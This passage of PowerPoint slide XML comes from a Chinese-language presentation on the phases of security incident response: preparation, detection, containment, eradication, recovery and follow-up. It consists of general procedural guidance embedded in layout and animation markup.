              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>根除</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="730920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422297-D7D8-D94A-B025-38BE16C1FFEF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="467544"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准备阶段</a:t>
            </a:r>
            <a:endParaRPr dirty="0">
              <a:solidFill>
                <a:srgbClr val="0033CC"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="矩形 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{19C434E2-1552-724E-8495-96273223F325}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="683568" y="2260332"/>
            <a:ext cx="5704285" cy="3831818"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>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进行调研分析；</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确定应急响应的目标；</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确定应急响应范围；</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制定应急响应预案；</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制定应急服务方案；</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0066FF"/>
              </a:solidFill>
              <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
            </a:endParaRP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签署应急响应服务承诺书；</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应急响应工具准备及更新维护；</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组建适当的管理与实施团队；	</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制定预防和预警机制；</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="48131"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4048" y="3068960"/>
            <a:ext cx="3833441"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1043608" y="1552446"/>
            <a:ext cx="7488832" cy="707886"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>应急响应的准备是整个应急响应过程有效性的保证。因此，在应急响应实施前，应该：</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="15981175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5"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45803" y="1340768"/>
            <a:ext cx="4092178" cy="434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D26E5DF-802B-8E48-AEF8-A9832D967614}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="827584" y="948333"/>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检测阶段</a:t>
            </a:r>
            <a:endParaRPr dirty="0">
              <a:solidFill>
                <a:srgbClr val="0033CC"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="矩形 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EA71BAAC-37A0-B840-9C42-C411E7754970}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1043608" y="2132856"/>
            <a:ext cx="4661519" cy="2400657"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">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000" dirty="0">
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>确定检测对象及范围</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0">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latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>判断是否为安全事件</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0">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latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>确定应急处理方案</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0">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latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>明确检测范围与检测行为规范</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0">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latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>预测应急处理方案可能造成的影响</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="11920126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172235-331A-214F-9AFD-D19FC9D46B5F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="323528" y="846307"/>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抑制阶段</a:t>
            </a:r>
            <a:endParaRPr dirty="0">
              <a:solidFill>
                <a:srgbClr val="0033CC"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="矩形 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{71136A83-D6EA-134F-9FB0-283EB1169CEF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="683568" y="1491353"/>
            <a:ext cx="4050506" cy="1477328"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>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明确抑制处理的目的</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明确抑制处理带来的风险</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抑制处理方案</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="矩形 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2A023024-5BC8-6B47-B340-0D5ED0D0C8C4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="683568" y="3212976"/>
            <a:ext cx="8306012" cy="3139321"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">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buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="n"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>应急抑制的目的是限制安全事件对受保护信息系统造成影响的范围和程度。应急抑制是信息安全应急响应工作中的重要环节，在信息安全事件发生的第一时间内对故障系统或区域实施有效的隔离和处理，或者根据所拥有的资源状况和事件的等级，采用临时切换到备份系统等措施降低事件损失、避免安全事件的扩散（例如蠕虫的大规模传播）和安全事件对受害系统的持续性破坏，有利于应急响应工作人员对安全事件做出迅速、准确的判断并采取正确的应对策略。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="n"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>应急抑制过程中，重要的是确保业务连续性，应尽量保证在备份系统中完全运行原来的业务。如果出现资源紧张，应尽可能保证重要资产优先运行，维持最基本的业务能力。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="n"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>将检测到的结果跟客户进行充分沟通，告知客户目前面临的主要问题，及处理方法。</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="50180" name="图片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918425"/>
            <a:ext cx="3725465" cy="2050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92408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EA8760-39BA-174E-A3B1-A74B8C822325}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="467544"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根除阶段</a:t>
            </a:r>
            <a:endParaRPr dirty="0">
              <a:solidFill>
                <a:srgbClr val="0033CC"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="52226"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1700808"/>
            <a:ext cx="5105400" cy="38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 name="矩形 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EC42D847-E077-8841-A335-6ECF8980C210}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1115616" y="1916832"/>
            <a:ext cx="2120503" cy="1427507"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>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确定根除方案</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明确风险</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事件根除记录</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2974467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52226"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="12" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="52226"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="1+#ppt_w/2"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="13" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="522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8832C3-F4D9-C043-85F2-EA355639DC89}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="323528" y="874513"/>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恢复阶段</a:t>
            </a:r>
            <a:endParaRPr dirty="0">
              <a:solidFill>
                <a:srgbClr val="0033CC"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="矩形 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BD1B29C0-8F24-E54B-99C4-C8D53AD4A1AF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="611560" y="1700808"/>
            <a:ext cx="4680520" cy="3785652"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">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明确风险</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重建系统</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lvl="1">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>数据备份</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0">
              <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>安装新操作系统</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0">
              <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>配置基线及访问控制</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0">
              <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>数据恢复</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0">
              <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>上线测试</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0">
              <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>应急演练</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="53251"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9686" y="1844824"/>
            <a:ext cx="5124314" cy="334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678670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53251"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="12" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="53251"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="1+#ppt_w/2"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="13" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="532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11BCA1-8031-3D43-995F-456D78A96AD5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="467544"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跟进阶段</a:t>
            </a:r>
            <a:endParaRPr dirty="0">
              <a:solidFill>
                <a:srgbClr val="0033CC"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="54274" name="矩形 2"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="517571" y="1844824"/>
            <a:ext cx="751140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 typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="n"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>从安全事件中吸取经验教训</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>非常关键，不停的自我完善的防护体系和策略才是最好的安全设计思路。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="n"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>将每次安全事故的表现和处理步骤发布</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>在内部的信息安全发布站点上，方便以后内部出现同样攻击事件后处理。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="n"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>对于内部</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>需要改善和做出调整的安全配置</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>在内部网络中</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>及时发布更新策略</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>。</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="54275" name="文本框 3"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="683568" y="4077072"/>
            <a:ext cx="784887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800" dirty="0">
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>        跟进阶段是应急响应的最后一个阶段，本阶段的内容主要是对抑制和根除的效果进行审计，确认系统没有被再次入侵，这种审计是一个需要定期进行的过程。通常第一次统计应该再一定期限之内进行，以后再进行复查，并输出跟进阶段的报告内容，跟进阶段还需要对事件处理情况进行总结，吸取经验教训，对已有安全防护措施和安全事件应急响应预案进行改进。</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="39482316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wipe(up)">
                                      <p:cBhvr>
                                        <p:cTn id="7" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="5427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4275"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="wipe(up)">
                                      <p:cBhvr>
                                        <p:cTn id="11" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="54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p:bldP spid="54275"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43608" y="2276872"/>
            <a:ext cx="7054924" cy="120032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eaLnBrk="0" hangingPunct="0"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="3600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>4.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="3600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:rPr>
              <a:t>应急响应</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="3600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0033CC"/>
                </a:solidFill>
